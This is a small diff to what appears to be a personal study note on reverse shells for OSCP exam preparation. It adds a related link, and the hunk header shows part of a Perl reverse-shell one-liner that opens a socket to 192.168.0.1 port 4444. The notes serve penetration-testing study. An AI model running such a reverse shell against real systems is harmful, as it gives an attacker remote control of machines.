@@ -7,6 +7,7 @@ perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STRE
 
 # Related
 
+- [20221003150275](/zet/20221003150275/README.md) firefox reverse shell toolbar hacktools
 - [20221014190001](/zet/20221014190001/README.md) kb file named kb/hacking/common-commands.md
 - [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
 
